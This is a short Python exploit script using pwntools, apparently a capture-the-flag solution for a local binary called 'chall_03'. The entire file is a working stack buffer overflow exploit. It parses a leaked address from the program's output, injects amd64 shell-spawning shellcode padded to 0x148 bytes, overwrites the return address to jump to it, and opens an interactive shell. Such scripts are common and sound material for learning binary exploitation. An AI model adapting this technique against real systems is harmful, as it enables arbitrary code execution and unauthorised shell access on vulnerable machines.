from pwn import *
p=process("./chall_03")
import re
p.recvline()
string = p.recvline()
leak = re.findall(b"(0x[0-9a-f]{4,16})",string)[0]
shelladdr = int(leak,16) 
context.arch = "amd64"
shellcode = asm(shellcraft.sh())
payload = shellcode + (0x148 - len(shellcode))*b"A" + p64(shelladdr) 
p.sendline(payload)
p.interactive()
